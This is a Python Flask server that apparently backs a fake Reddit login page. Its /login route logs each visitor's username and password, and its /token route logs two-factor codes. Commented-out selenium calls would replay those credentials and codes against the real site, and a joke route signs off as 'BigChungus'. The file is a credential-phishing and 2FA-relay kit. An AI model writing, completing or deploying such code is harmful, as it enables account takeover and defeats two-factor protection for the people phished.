import logging
import sys
import json

from flask import (Flask, render_template, redirect, url_for, request, jsonify)

import selenium_driver as sd

app = Flask(__name__)

@app.route('/')
def index():
    return render_template('reddit.html')

@app.route('/login', methods=['POST'])
def login():
    data = json.loads(request.data)
    user = data['username']
    pswd = data['password']

    app.logger.info('user: {}  //  pass: {}'.format(user, pswd))

    # err = sd.do_login(Username=user, Password=pswd)
    err = sd.SUCCESS_NO_TWOAUTH

    res = {'valid': False, '2fa': False}

    if err == sd.SUCCESS_NO_TWOAUTH:
        res['valid'] = True
    if err == sd.SUCCESS_TWOAUTH:
        res['valid'] = True
        res['2fa'] = True

    return jsonify(res)

@app.route('/token', methods=['POST'])
def twofa():
    data = json.loads(request.data)
    tok = data['token']

    app.logger.info('tok: {}'.format(tok))

    # valid = sd.do_twoauth(tok)
    valid = True

    return jsonify({'valid': valid})

@app.route('/shrek', methods=['GET'])
def shrek():
    return 'YOU GOT SHREKED!!\n\n\tRegards,\n\tBigChungus'

if __name__ == '__main__':
    # app.before_first_request(sd.setup)
    app.run(debug=True)
